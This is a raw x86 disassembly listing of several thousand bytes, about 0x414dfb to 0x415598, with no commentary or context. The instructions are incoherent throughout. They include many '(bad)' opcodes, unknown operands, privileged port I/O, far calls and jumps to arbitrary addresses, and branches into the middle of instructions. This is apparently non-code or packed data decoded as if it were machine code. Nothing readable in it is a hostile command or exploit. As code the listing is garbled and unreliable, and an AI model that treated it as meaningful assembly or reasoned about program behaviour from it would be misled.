  414dfb:	shl    BYTE PTR [edx+0x4227859],0x30
  414e02:	popf   
  414e03:	mov    edi,DWORD PTR [ebx-0x4a]
  414e06:	sbb    ch,BYTE PTR [edx+0x2d368f8d]
  414e0c:	shl    bl,0x9d
  414e0f:	pop    ebx
  414e10:	mov    eax,ds:0x1034713b
  414e15:	push   ecx
  414e16:	pop    es
  414e17:	das    
  414e18:	cmp    ah,BYTE PTR [eax-0x57]
  414e1b:	das    
  414e1c:	out    dx,al
  414e1d:	or     bh,BYTE PTR [edi]
  414e1f:	outs   dx,BYTE PTR ds:[esi]
  414e20:	sbb    DWORD PTR [ebp+0x6946d88e],0x39
  414e27:	xor    eax,DWORD PTR [edx+0x1]
  414e2a:	gs pop ebx
  414e2c:	mov    eax,ds:0xb0d081c9
  414e31:	adc    al,0xb5
  414e33:	out    dx,eax
  414e34:	ror    BYTE PTR [ebp+0x144a95d7],cl
  414e3a:	add    al,0x6
  414e3c:	pop    esi
  414e3d:	or     DWORD PTR [esi+0x4d],ebp
  414e40:	fisubr DWORD PTR [eax+0x541d26d]
  414e46:	adc    ebx,DWORD PTR [edx]
  414e48:	lahf   
  414e49:	ins    DWORD PTR es:[edi],dx
  414e4a:	ins    DWORD PTR es:[edi],dx
  414e4b:	pcmpeqb mm7,QWORD PTR [esp+esi*8]
  414e4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414e50:	icebp  
  414e51:	mov    ecx,0x356566a5
  414e56:	sahf   
  414e57:	adc    esp,DWORD PTR [ebx+0x2c663056]
  414e5d:	adc    bh,BYTE PTR es:[ecx+0x7171167e]
  414e64:	adc    eax,0x54329a71
  414e69:	repz call 0x9d2dec3c
  414e6f:	jmp    0x414e3d
  414e71:	int3   
  414e72:	imul   ebx,DWORD PTR [ecx+0x5a],0x32b5d21a
  414e79:	dec    edx
  414e7a:	push   eax
  414e7b:	repnz push 0xffffffb1
  414e7e:	pop    esi
  414e7f:	out    dx,eax
  414e80:	ret    
  414e81:	cmp    BYTE PTR [ecx+0x1b],bl
  414e84:	or     BYTE PTR [edi-0x46],ch
  414e87:	adc    edx,DWORD PTR [esi+0xa]
  414e8a:	stos   BYTE PTR es:[edi],al
  414e8b:	lock test al,0xae
  414e8e:	arpl   WORD PTR [esi+0x3bad18bd],ax
  414e94:	jno    0x414e26
  414e96:	xchg   ebp,eax
  414e97:	ds loope 0x414e53
  414e9a:	fmul   DWORD PTR [esi-0x39]
  414e9d:	mov    esi,0x21953b9
  414ea2:	and    DWORD PTR [esp+eax*2+0x6c],esp
  414ea6:	jp     0x414e5d
  414ea8:	adc    esi,DWORD PTR [esi]
  414eaa:	jmp    0x414e6a
  414eac:	shl    BYTE PTR [ecx-0x5f],1
  414eaf:	test   al,ah
  414eb1:	push   ss
  414eb2:	stos   DWORD PTR es:[edi],eax
  414eb3:	and    DWORD PTR [esi+ecx*2-0x36],edi
  414eb7:	popa   
  414eb8:	dec    edi
  414eb9:	sbb    DWORD PTR [ebx-0x3],ebx
  414ebc:	jae    0x414efa
  414ebe:	lods   eax,DWORD PTR ds:[esi]
  414ebf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414ec0:	in     al,0x4
  414ec2:	loopne 0x414f29
  414ec4:	test   DWORD PTR [ecx-0xa2a6308],edi
  414eca:	retf   0xc779
  414ecd:	pop    esp
  414ece:	iret   
  414ecf:	mov    esp,0xbcc0f915
  414ed4:	jns    0x414ed8
  414ed6:	js     0x414e80
  414ed8:	adc    al,0x23
  414eda:	gs daa 
  414edc:	dec    ecx
  414edd:	test   al,0x7f
  414edf:	jecxz  0x414ed7
  414ee1:	sahf   
  414ee2:	fld    DWORD PTR [esi+0x28c7df55]
  414ee8:	sbb    DWORD PTR [ecx+eiz*1+0x11],edx
  414eec:	push   cs
  414eed:	mov    eax,ds:0x8695f307
  414ef2:	ins    DWORD PTR es:[edi],dx
  414ef3:	pop    ebp
  414ef4:	xchg   DWORD PTR [ebp+0x63],ebp
  414ef7:	dec    edx
  414ef8:	pop    ebx
  414ef9:	push   0x8
  414efb:	ds es in al,0x2
  414eff:	push   0xffffffad
  414f01:	mov    ebp,0x9879dfaa
  414f06:	fdivrp st(2),st
  414f08:	adc    DWORD PTR [esi+0x63],ecx
  414f0b:	fsubr  st,st(3)
  414f0d:	cld    
  414f0e:	aaa    
  414f0f:	dec    eax
  414f10:	mov    BYTE PTR [ebx+0x1d9bba81],al
  414f16:	scas   al,BYTE PTR es:[edi]
  414f17:	cwde   
  414f18:	xor    ebp,ebx
  414f1a:	mov    eax,0xd5d74cb7
  414f1f:	scas   eax,DWORD PTR es:[edi]
  414f20:	xchg   ebx,eax
  414f21:	push   eax
  414f22:	adc    DWORD PTR [eax+edx*1],ebp
  414f25:	dec    ebx
  414f26:	repz and eax,0xf7e03dea
  414f2c:	pminub mm6,QWORD PTR [ebp+0x4]
  414f30:	ret    0xa9d3
  414f33:	fwait
  414f34:	add    eax,0x7d26463e
  414f39:	(bad)  
  414f3a:	test   eax,0x90462485
  414f3f:	inc    ebp
  414f40:	enter  0x2b12,0x8d
  414f44:	add    DWORD PTR [ecx+eiz*4-0x69d2762f],esi
  414f4b:	cmp    eax,0xd5b51913
  414f50:	js     0x414fcb
  414f52:	enter  0x6d0f,0x53
  414f56:	jae    0x414ee4
  414f58:	mov    WORD PTR [edx+eiz*4-0x11],?
  414f5c:	push   ecx
  414f5d:	or     eax,0xea10d61
  414f62:	jnp    0x414eed
  414f64:	aam    0xd4
  414f66:	lods   al,BYTE PTR ds:[esi]
  414f67:	daa    
  414f68:	sar    DWORD PTR [ecx],0x71
  414f6b:	mov    ah,0x53
  414f6d:	mov    dh,0xd7
  414f6f:	mov    DWORD PTR ds:0x6999fb50,eax
  414f75:	aam    0x9e
  414f77:	and    dl,BYTE PTR [ebx-0xc]
  414f7a:	scas   al,BYTE PTR es:[edi]
  414f7b:	ret    
  414f7c:	mov    ebx,0xf078318
  414f81:	ja     0x414fe4
  414f83:	scas   al,BYTE PTR es:[edi]
  414f84:	retf   
  414f85:	loope  0x414f17
  414f87:	cmp    al,0x20
  414f89:	mov    ?,WORD PTR [ebp+0x2e7620dc]
  414f8f:	or     edi,esi
  414f91:	push   ebp
  414f92:	mov    ebx,0xf8b6a972
  414f97:	jns    0x414f73
  414f99:	icebp  
  414f9a:	loop   0x414fca
  414f9c:	push   cs
  414f9d:	popf   
  414f9e:	dec    edx
  414f9f:	xor    cl,BYTE PTR [ecx+eiz*8-0x21de4197]
  414fa6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414fa7:	cli    
  414fa8:	xchg   esi,eax
  414fa9:	mov    ds:0x8f8db584,al
  414fae:	push   ecx
  414faf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414fb0:	jl     0x414f42
  414fb2:	mov    WORD PTR [ebx+eax*1+0x1e40650c],?
  414fb9:	cmp    dl,0x56
  414fbc:	fist   DWORD PTR [edx+0x54]
  414fbf:	sbb    eax,0x612425fa
  414fc4:	out    0xfd,al
  414fc6:	in     eax,dx
  414fc7:	mov    dl,0xd3
  414fc9:	cwde   
  414fca:	mov    ds:0x768e177,al
  414fcf:	scas   eax,DWORD PTR es:[edi]
  414fd0:	sbb    ah,dl
  414fd2:	cwde   
  414fd3:	pop    ebp
  414fd4:	fwait
  414fd5:	cld    
  414fd6:	xchg   esp,eax
  414fd7:	cwde   
  414fd8:	hlt    
  414fd9:	test   eax,0xea3de33
  414fde:	daa    
  414fdf:	repnz inc ecx
  414fe1:	popa   
  414fe2:	sub    al,0xae
  414fe4:	fcmovb st,st(2)
  414fe6:	cld    
  414fe7:	cld    
  414fe8:	sbb    eax,edi
  414fea:	push   ebp
  414feb:	paddd  mm3,QWORD PTR [eax-0x61]
  414fef:	jb     0x41501a
  414ff1:	int3   
  414ff2:	inc    edi
  414ff3:	mov    ds:0xa27e52e8,al
  414ff8:	pop    eax
  414ff9:	daa    
  414ffa:	ss sub eax,0xe3d01d20
  415000:	loope  0x415003
  415002:	dec    edx
  415003:	push   ebp
  415004:	call   0xab6c:0x54458048
  41500b:	mov    DWORD PTR [ecx+0x72],ebx
  41500e:	sbb    DWORD PTR [ecx+0x59],0xffffff9d
  415012:	das    
  415013:	push   ebx
  415014:	xchg   ecx,eax
  415015:	arpl   WORD PTR [edi],bp
  415017:	je     0x415017
  415019:	fs loopne 0x415009
  41501c:	sub    ch,bl
  41501e:	xchg   esi,eax
  41501f:	pop    ebx
  415020:	dec    edx
  415021:	addr16 add eax,0x603a626e
  415027:	and    esp,DWORD PTR [esi]
  415029:	pop    edx
  41502a:	pop    ebp
  41502b:	or     cl,BYTE PTR [eax+0x34c33cd8]
  415031:	mov    ebx,0xcf879606
  415036:	ret    
  415037:	add    BYTE PTR [ecx+0x6e],al
  41503a:	add    eax,0xf78872b9
  41503f:	arpl   WORD PTR [esi+ecx*1],ax
  415042:	mov    dl,0x5f
  415044:	cs in  eax,0x70
  415047:	or     DWORD PTR [esi],ecx
  415049:	dec    esi
  41504a:	ror    BYTE PTR [ebx+esi*4+0x36],cl
  41504e:	ret    0x37a2
  415051:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415052:	pop    es
  415053:	std    
  415054:	push   esi
  415055:	repnz xlat BYTE PTR ds:[ebx]
  415057:	out    0x17,al
  415059:	push   ebx
  41505a:	cwde   
  41505b:	test   eax,0xb9f17844
  415060:	adc    eax,0xb7b9ff1f
  415065:	enter  0xd1cc,0xdc
  415069:	dec    ecx
  41506a:	pop    es
  41506b:	mov    cs,WORD PTR [eax-0x1f]
  41506e:	int3   
  41506f:	inc    ebp
  415070:	jp     0x41504e
  415072:	sbb    DWORD PTR [edx+ebp*8],edx
  415075:	retf   0xbe9b
  415078:	shr    DWORD PTR [edx-0x3efe1004],cl
  41507e:	sar    bl,cl
  415080:	xchg   edx,eax
  415081:	loope  0x415099
  415083:	and    eax,0xb012e308
  415088:	sub    al,0x8a
  41508a:	fidiv  DWORD PTR [edi]
  41508c:	inc    esp
  41508d:	mov    edx,0x45c6b652
  415092:	sub    ebp,edx
  415094:	out    0xa2,al
  415096:	sti    
  415097:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415098:	arpl   cx,sp
  41509a:	fidivr WORD PTR [edx+0x4e]
  41509d:	inc    esp
  41509e:	test   bh,0x2e
  4150a1:	pop    ss
  4150a2:	cmp    dh,BYTE PTR [ecx-0x54a51300]
  4150a8:	js     0x4150ee
  4150aa:	add    al,0xfd
  4150ac:	sbb    eax,0x25118030
  4150b1:	gs jns 0x4150dc
  4150b4:	shr    ecx,1
  4150b6:	push   ds
  4150b7:	dec    ebx
  4150b8:	imul   BYTE PTR [ecx]
  4150ba:	test   BYTE PTR [edi],0x2c
  4150bd:	mov    BYTE PTR [ebx],al
  4150bf:	popa   
  4150c0:	cs div bl
  4150c3:	mov    ah,0xce
  4150c5:	loop   0x41505c
  4150c7:	jns    0x415101
  4150c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4150ca:	in     al,dx
  4150cb:	pop    ecx
  4150cc:	xor    eax,0x3d21876f
  4150d1:	pop    ebp
  4150d2:	mov    cs:0x6c78f448,al
  4150d8:	aas    
  4150d9:	es addr16 push ebp
  4150dc:	mov    ebp,0x4359e0cb
  4150e1:	shr    BYTE PTR [edx-0x49],1
  4150e4:	push   ebx
  4150e5:	sub    al,0xe7
  4150e7:	shl    DWORD PTR ds:0x384f8bb8,cl
  4150ed:	arpl   dx,si
  4150ef:	sbb    al,0x7c
  4150f1:	sbb    DWORD PTR [esi],esi
  4150f3:	adc    eax,0xe15a1232
  4150f8:	or     al,0x7a
  4150fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4150fb:	fstp   st(6)
  4150fd:	fiadd  WORD PTR [edi-0x749497cb]
  415103:	jne    0x4150f7
  415105:	cld    
  415106:	add    bl,dh
  415108:	jb     0x4150bf
  41510a:	xchg   edx,eax
  41510b:	out    0x45,eax
  41510d:	iret   
  41510e:	push   ebx
  41510f:	push   ds
  415110:	retf   
  415111:	dec    edi
  415112:	je     0x415111
  415114:	cmp    ebp,ebx
  415116:	pop    edi
  415117:	in     eax,dx
  415118:	push   edi
  415119:	(bad)  
  41511a:	jbe    0x4150fa
  41511c:	pusha  
  41511d:	shl    DWORD PTR [ebx+0x53128e86],1
  415123:	out    dx,al
  415124:	push   ds
  415125:	mov    cl,0xe4
  415127:	aam    0x5c
  415129:	adc    bl,BYTE PTR [edx]
  41512b:	mov    dh,BYTE PTR [ebp-0x6e]
  41512e:	jno    0x415122
  415130:	arpl   dx,ax
  415132:	sbb    al,0x5f
  415134:	adc    al,0x9c
  415136:	push   ecx
  415137:	push   ecx
  415138:	nop
  415139:	push   esp
  41513a:	lods   eax,DWORD PTR ds:[esi]
  41513b:	mul    DWORD PTR [esi-0xf]
  41513e:	out    0x7,eax
  415140:	dec    eax
  415141:	cdq    
  415142:	inc    ebx
  415143:	jmp    DWORD PTR [edi-0x74b74334]
  415149:	shr    DWORD PTR [ebx],0x6d
  41514c:	out    dx,eax
  41514d:	jp     0x41515e
  41514f:	fiadd  DWORD PTR [eax-0x24b652c9]
  415155:	mov    eax,0xfe29657b
  41515a:	aam    0x8c
  41515c:	pop    ebx
  41515d:	test   al,0x20
  41515f:	fild   DWORD PTR [eax+0x65]
  415162:	sub    eax,0xab18ad89
  415167:	sar    ebp,cl
  415169:	and    dh,BYTE PTR [ebp-0x5f]
  41516c:	jmp    0xad9c:0x392d1e95
  415173:	push   ebp
  415174:	sbb    eax,0x627dadb1
  415179:	pop    ss
  41517a:	sub    bl,BYTE PTR [edx]
  41517c:	scas   eax,DWORD PTR es:[edi]
  41517d:	mov    ds:0xaa9d0bb7,al
  415182:	leave  
  415183:	sbb    eax,0x1d2a674b
  415188:	inc    eax
  415189:	(bad)  
  41518a:	adc    ecx,DWORD PTR [edi]
  41518c:	lods   al,BYTE PTR ds:[esi]
  41518d:	adc    al,BYTE PTR [ecx]
  41518f:	cmp    al,0xa4
  415191:	cmp    DWORD PTR [edx],esp
  415193:	leave  
  415194:	cmp    dh,al
  415196:	stos   BYTE PTR es:[edi],al
  415197:	or     DWORD PTR [ebx],ecx
  415199:	push   esp
  41519a:	bound  edi,QWORD PTR [edi-0x370f0ee8]
  4151a0:	inc    esi
  4151a1:	aas    
  4151a2:	sbb    eax,0xf5933923
  4151a7:	jns    0x41519a
  4151a9:	mov    ds:0x53c2abd4,al
  4151ae:	xchg   ebp,eax
  4151af:	pop    ds
  4151b0:	mov    ecx,0xff732218
  4151b5:	xchg   ebp,eax
  4151b6:	dec    ebx
  4151b7:	dec    esi
  4151b8:	mov    ss,edx
  4151ba:	mov    ah,0x5f
  4151bc:	es enter 0x706f,0xfe
  4151c1:	mov    ebx,0x7017bb3c
  4151c6:	mov    edx,0xf5b907e
  4151cb:	mov    eax,0x702def3f
  4151d0:	add    eax,ebp
  4151d2:	pop    esi
  4151d3:	fcos   
  4151d5:	lea    ebp,[ecx]
  4151d7:	ror    ecx,0x77
  4151da:	xor    eax,0xb1ed214a
  4151df:	shl    DWORD PTR [ecx+0x5bef4e83],0xfe
  4151e6:	mov    DWORD PTR [edx],edx
  4151e8:	cli    
  4151e9:	out    0x21,eax
  4151eb:	out    0xe4,eax
  4151ed:	or     BYTE PTR [ecx],dh
  4151ef:	ret    
  4151f0:	mov    dh,0xf2
  4151f2:	arpl   WORD PTR [eax-0x5b4cc295],si
  4151f8:	jno    0x41526b
  4151fa:	pop    ds
  4151fb:	into   
  4151fc:	(bad)  
  4151fd:	lods   eax,DWORD PTR ds:[esi]
  4151fe:	imul   ecx,DWORD PTR [ecx-0x51],0x98b4aa76
  415205:	cmp    eax,0x192f8b5
  41520a:	mov    ecx,DWORD PTR [edx-0x1375a3b1]
  415210:	adc    al,0x9a
  415212:	(bad)  
  415213:	cld    
  415214:	aas    
  415215:	mov    eax,ds:0xa6ce0e5e
  41521a:	adc    eax,0x4b7f9ae4
  41521f:	pop    eax
  415220:	add    dh,0x73
  415223:	and    DWORD PTR [eax],esi
  415225:	dec    esi
  415226:	mov    al,0xd4
  415228:	jo     0x41525b
  41522a:	lods   eax,DWORD PTR ds:[esi]
  41522b:	adc    bl,ch
  41522d:	lds    esi,FWORD PTR [edi-0x4c]
  415230:	cmp    DWORD PTR [esi+0x73],edi
  415233:	jmp    DWORD PTR [edi-0x7ee68f3a]
  415239:	mov    ah,0xb8
  41523b:	ret    0x735d
  41523e:	or     al,0x5c
  415240:	sbb    edi,DWORD PTR [edx]
  415242:	in     al,dx
  415243:	hlt    
  415244:	pop    edx
  415245:	sbb    ch,dl
  415247:	popa   
  415248:	lds    edx,FWORD PTR [esi]
  41524a:	inc    esi
  41524b:	ss adc al,0x91
  41524e:	and    bl,BYTE PTR [edx]
  415250:	dec    edx
  415251:	and    cl,BYTE PTR [ebp-0x7ef24e29]
  415257:	je     0x4151e9
  415259:	and    eax,0xdd3241bf
  41525e:	push   edi
  41525f:	inc    ebp
  415260:	dec    ecx
  415261:	jmp    0x4152d6
  415263:	ror    DWORD PTR [edi+0x68],cl
  415266:	xchg   BYTE PTR [ecx],dl
  415268:	js     0x4152af
  41526a:	fistp  QWORD PTR [eax]
  41526c:	ins    DWORD PTR es:[edi],dx
  41526d:	inc    esi
  41526e:	sbb    DWORD PTR [ebp-0x69],esi
  415271:	scas   al,BYTE PTR es:[edi]
  415272:	fisubr DWORD PTR [ecx]
  415274:	rcr    cl,0xcd
  415277:	adc    edx,edx
  415279:	loopne 0x4151fe
  41527b:	lds    ecx,FWORD PTR [ebx]
  41527d:	mov    cx,0x8541
  415281:	fist   WORD PTR [ebp-0x28a1115c]
  415287:	push   ss
  415288:	push   es
  415289:	into   
  41528a:	lahf   
  41528b:	jno    0x41527e
  41528d:	dec    ebp
  41528e:	test   bh,cl
  415290:	cld    
  415291:	dec    ebp
  415292:	cmp    esi,DWORD PTR [ecx+ebx*2]
  415295:	lock inc ebx
  415297:	sbb    esp,ecx
  415299:	inc    esi
  41529a:	outs   dx,BYTE PTR ds:[esi]
  41529b:	push   ebp
  41529c:	iret   
  41529d:	cld    
  41529e:	pop    esi
  41529f:	pop    eax
  4152a0:	lods   eax,DWORD PTR ds:[esi]
  4152a1:	pusha  
  4152a2:	fst    QWORD PTR [esi-0x56]
  4152a5:	js     0x415238
  4152a7:	nop
  4152a8:	and    ch,0x8c
  4152ab:	mov    ds:0xce14608f,eax
  4152b0:	sub    BYTE PTR [ebx-0x1f],bl
  4152b3:	and    BYTE PTR [ebp+0x7544ded],al
  4152b9:	mov    edi,0x9b59faa4
  4152be:	inc    ebx
  4152bf:	adc    bl,BYTE PTR [edi]
  4152c1:	mov    ds:0x48751352,eax
  4152c6:	push   es
  4152c7:	rcl    DWORD PTR ds:0x1ef2c3a4,1
  4152cd:	not    cl
  4152cf:	mov    DWORD PTR [edx-0x3cc690ba],ecx
  4152d5:	stos   BYTE PTR es:[edi],al
  4152d6:	fsubr  DWORD PTR [edi-0x46d7f8ee]
  4152dc:	lock jle 0x415317
  4152df:	jl     0x41527c
  4152e1:	ins    DWORD PTR es:[edi],dx
  4152e2:	mov    esi,0x9d19ca70
  4152e7:	(bad)  
  4152e8:	fsubr  QWORD PTR [ebx+0x6afbc124]
  4152ee:	lds    esp,FWORD PTR [ebx+ecx*1+0x27]
  4152f2:	xchg   esp,eax
  4152f3:	xchg   edx,eax
  4152f4:	mov    ebp,0xdc4d0728
  4152f9:	adc    al,0x22
  4152fb:	xchg   ebp,eax
  4152fc:	pop    ebp
  4152fd:	and    al,0x38
  4152ff:	imul   esi,DWORD PTR [edi],0x7e066741
  415305:	push   eax
  415306:	inc    edi
  415307:	ds jmp 0x5b26:0xac702cb1
  41530f:	in     eax,0xbe
  415311:	jl     0x415360
  415313:	fstp   DWORD PTR [eax]
  415315:	retf   0x77f0
  415318:	sub    DWORD PTR [edx-0x4b],esp
  41531b:	(bad)  
  41531c:	dec    edi
  41531d:	fcom   QWORD PTR [ecx]
  41531f:	ins    DWORD PTR es:[edi],dx
  415320:	sbb    BYTE PTR ds:0xa43b9da9,dh
  415326:	pop    ss
  415327:	cmp    ebp,DWORD PTR [edi]
  415329:	leave  
  41532a:	push   edx
  41532b:	lods   eax,DWORD PTR ds:[esi]
  41532c:	aas    
  41532d:	pop    edx
  41532e:	in     al,0xc8
  415330:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415331:	test   al,0xce
  415333:	(bad)  
  415334:	daa    
  415335:	call   0xf2c17620
  41533a:	aad    0xb8
  41533c:	jge    0x41538f
  41533e:	dec    edx
  41533f:	add    ebp,esp
  415341:	pop    ds
  415342:	sbb    eax,0x65bd78b3
  415347:	les    eax,FWORD PTR [ecx]
  415349:	js     0x415376
  41534b:	xchg   esi,eax
  41534c:	push   ds
  41534d:	and    DWORD PTR [ebx-0x6f],eax
  415350:	test   esi,edi
  415352:	pushf  
  415353:	jmp    0x4a3fe506
  415358:	loope  0x415390
  41535a:	inc    ebx
  41535b:	ret    0x217f
  41535e:	mov    dl,0x31
  415360:	or     dl,BYTE PTR [esi-0x16e504e]
  415366:	xchg   ebp,eax
  415367:	cmp    eax,0xa3c71ecf
  41536c:	xchg   ebx,eax
  41536d:	ror    DWORD PTR [esi+0x3a],0xd1
  415371:	inc    esi
  415372:	cld    
  415373:	xor    BYTE PTR [eax+ecx*2-0x719ef105],al
  41537a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41537b:	in     eax,dx
  41537c:	aad    0x90
  41537e:	xlat   BYTE PTR ds:[ebx]
  41537f:	or     al,0x8d
  415381:	shl    BYTE PTR [ebx],0xfd
  415384:	push   fs
  415386:	push   es
  415387:	ins    DWORD PTR es:[edi],dx
  415388:	sbb    cl,BYTE PTR [eax]
  41538a:	and    al,ah
  41538c:	call   DWORD PTR [edx-0x52a9ce64]
  415392:	(bad)  
  415393:	jp     0x41536b
  415395:	xchg   esp,ecx
  415397:	call   0x7c650910
  41539c:	dec    ebx
  41539d:	push   cs
  41539e:	loop   0x415416
  4153a0:	bound  ebx,QWORD PTR [ebp-0x4f5b9ce7]
  4153a6:	dec    ecx
  4153a7:	inc    DWORD PTR [edx]
  4153a9:	inc    ebp
  4153aa:	xchg   ecx,edi
  4153ac:	add    al,ch
  4153ae:	data16 jp 0x4153ba
  4153b1:	ss jo  0x415378
  4153b4:	push   0x36
  4153b6:	stc    
  4153b7:	int    0xbd
  4153b9:	loopne 0x4153cc
  4153bb:	callw  0x92a
  4153bf:	mov    eax,ds:0x176910f0
  4153c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4153c5:	dec    ebp
  4153c6:	jg     0x41536c
  4153c8:	dec    esi
  4153c9:	jns    0x4153fc
  4153cb:	dec    ch
  4153cd:	retf   
  4153ce:	xchg   DWORD PTR [ecx+0x38b6fad1],esp
  4153d4:	fdivp  st(0),st
  4153d6:	jl     0x415410
  4153d8:	and    DWORD PTR [eax-0x5e],0x7df85368
  4153df:	add    eax,0x5c29eacf
  4153e4:	std    
  4153e5:	lock or DWORD PTR [edi],esp
  4153e8:	out    0x24,al
  4153ea:	leave  
  4153eb:	ins    BYTE PTR es:[edi],dx
  4153ec:	jbe    0x415377
  4153ee:	pop    esi
  4153ef:	fs pop ss
  4153f1:	sub    edi,ebx
  4153f3:	mov    ecx,cs
  4153f5:	pushf  
  4153f6:	out    dx,al
  4153f7:	sub    BYTE PTR [ebx],cl
  4153f9:	sti    
  4153fa:	add    al,0x13
  4153fc:	fcmovnu st,st(5)
  4153fe:	jle    0x415387
  415400:	mov    ch,BYTE PTR [ebx]
  415402:	scas   al,BYTE PTR es:[edi]
  415403:	jae    0x41545f
  415405:	mov    ebp,0xb4e6a2df
  41540a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41540b:	adc    BYTE PTR [edx+0x4256bc1e],dl
  415411:	lahf   
  415412:	icebp  
  415413:	or     eax,0x89012df6
  415418:	mov    bl,BYTE PTR [eax]
  41541a:	xlat   BYTE PTR ds:[ebx]
  41541b:	call   0x34b0:0xed505fd
  415422:	xlat   BYTE PTR ss:[ebx]
  415424:	(bad)  
  415425:	mov    bh,0x75
  415427:	mov    ebp,0xab1a0383
  41542c:	sub    BYTE PTR [edx+0x50],ah
  41542f:	out    dx,eax
  415430:	jecxz  0x415490
  415432:	xchg   esp,ecx
  415434:	and    ecx,eax
  415436:	mov    ecx,0xb46b8f7a
  41543b:	data16 das 
  41543d:	ins    DWORD PTR es:[edi],dx
  41543e:	or     eax,0xd121c61a
  415443:	inc    edi
  415444:	sar    BYTE PTR [eax-0x15],cl
  415447:	pop    es
  415448:	test   bh,cl
  41544a:	pop    esp
  41544b:	mov    ds:0xba6767b2,al
  415450:	into   
  415451:	push   esp
  415452:	pop    ss
  415453:	mov    dl,0x21
  415455:	pop    esi
  415456:	ins    BYTE PTR es:[edi],dx
  415457:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415458:	out    dx,al
  415459:	test   eax,0x51ffe920
  41545e:	test   BYTE PTR [ebx],bh
  415460:	test   eax,0xa377fe85
  415465:	push   edi
  415466:	dec    ebp
  415467:	imul   DWORD PTR [edx]
  415469:	dec    ecx
  41546a:	dec    esi
  41546b:	sti    
  41546c:	sub    bl,BYTE PTR [esi+edi*2]
  41546f:	xlat   BYTE PTR ds:[ebx]
  415470:	pop    ebp
  415471:	call   0x1cdc4383
  415476:	push   ebp
  415477:	lahf   
  415478:	and    ebx,DWORD PTR [ebx]
  41547a:	out    dx,al
  41547b:	or     ah,bl
  41547d:	adc    dl,BYTE PTR [edx-0x79]
  415480:	xchg   edi,eax
  415481:	ins    BYTE PTR es:[edi],dx
  415482:	cmp    al,0xdf
  415484:	adc    eax,0x3b70e99d
  415489:	lods   al,BYTE PTR ds:[esi]
  41548a:	add    eax,0xa1eb1a59
  41548f:	add    eax,0x47e8b609
  415494:	mov    ecx,0x85e8f637
  415499:	jo     0x4154a7
  41549b:	pop    ebx
  41549c:	mov    ecx,DWORD PTR [eax-0x2f]
  41549f:	popf   
  4154a0:	imul   ecx,DWORD PTR ds:0x890f406e,0xffffffbc
  4154a7:	outs   dx,DWORD PTR ds:[esi]
  4154a8:	cmp    BYTE PTR [ebx+0x5fff5900],ah
  4154ae:	sub    al,0xba
  4154b0:	and    edx,DWORD PTR [esi]
  4154b2:	(bad)  
  4154b3:	xchg   ebp,eax
  4154b4:	mov    eax,ds:0x7872156
  4154b9:	ja     0x41546d
  4154bb:	bnd jp 0x4154be
  4154be:	std    
  4154bf:	mov    eax,0xdfb16bc1
  4154c4:	inc    esi
  4154c5:	pop    edi
  4154c6:	out    0x5d,al
  4154c8:	scas   al,BYTE PTR es:[edi]
  4154c9:	(bad)  
  4154cb:	cs mov dl,0x63
  4154ce:	stos   BYTE PTR es:[edi],al
  4154cf:	mov    al,ds:0xe4e58cf4
  4154d4:	xchg   ebx,eax
  4154d5:	mov    BYTE PTR [eax-0xd95b0c7],dh
  4154db:	cmp    ebp,ecx
  4154dd:	sbb    al,0x77
  4154df:	add    eax,0xf8fbf9e
  4154e4:	cmp    al,0x77
  4154e6:	std    
  4154e7:	cwde   
  4154e8:	xchg   esi,eax
  4154e9:	ret    
  4154ea:	popf   
  4154eb:	mov    bl,0xaf
  4154ed:	das    
  4154ee:	gs sti 
  4154f0:	adc    DWORD PTR [esi+edi*8-0x1d7b8534],0xffffff9f
  4154f8:	sahf   
  4154f9:	hlt    
  4154fa:	repnz ficom DWORD PTR [edi-0x7368a011]
  415501:	sbb    al,0xa7
  415503:	and    al,cl
  415505:	fidiv  WORD PTR [edi+0x2a]
  415508:	mov    edi,es
  41550a:	push   ss
  41550b:	addr16 xor ch,ch
  41550e:	mov    al,0x46
  415510:	test   DWORD PTR [edx-0x7eecacc1],0xfcb02ea0
  41551a:	jnp    0x415524
  41551c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41551d:	push   cs
  41551e:	cmp    BYTE PTR [edx+0x44],bl
  415521:	add    BYTE PTR [ecx],0xdb
  415524:	leave  
  415525:	pop    esi
  415526:	aas    
  415527:	inc    edx
  415528:	and    DWORD PTR [ecx-0x7e],eax
  41552b:	add    BYTE PTR [ecx-0x7e],al
  41552e:	pop    edx
  41552f:	rcl    BYTE PTR [ebx*1-0x56a57666],0xc8
  415537:	add    edx,DWORD PTR [edx+0x5fbfba0f]
  41553d:	sbb    eax,0x6fb743a3
  415542:	retf   
  415543:	and    eax,0xccb17d2e
  415548:	mov    eax,ds:0x870c0353
  41554d:	push   ebx
  41554e:	fwait
  41554f:	mov    ch,0xb5
  415551:	repnz push es
  415553:	das    
  415554:	xor    al,0x77
  415556:	or     eax,0x236ed482
  41555b:	sub    BYTE PTR [eax+0x5a],dh
  41555e:	lods   al,BYTE PTR ds:[esi]
  41555f:	popf   
  415560:	pop    esi
  415561:	sbb    BYTE PTR [edx-0xc],dl
  415564:	push   esp
  415565:	inc    eax
  415566:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415567:	(bad)  
  415568:	out    dx,eax
  415569:	(bad)  
  41556a:	cmp    eax,0xa5c1db59
  41556f:	out    0xbd,eax
  415571:	hlt    
  415572:	shl    DWORD PTR [esi],cl
  415574:	mov    edi,0xaffc43db
  415579:	push   ds
  41557a:	sbb    eax,0x6458f9d
  41557f:	scas   eax,DWORD PTR es:[edi]
  415580:	mov    al,ds:0x31345cf1
  415585:	(bad)
  415589:	imul   ebp,edi,0x4cf156e4
  41558f:	push   es
  415590:	dec    dl
  415592:	sbb    eax,DWORD PTR [edx-0x32ba19eb]
  415598:	cmp    DWORD PTR [ebp-0x3d],0xffffffd1
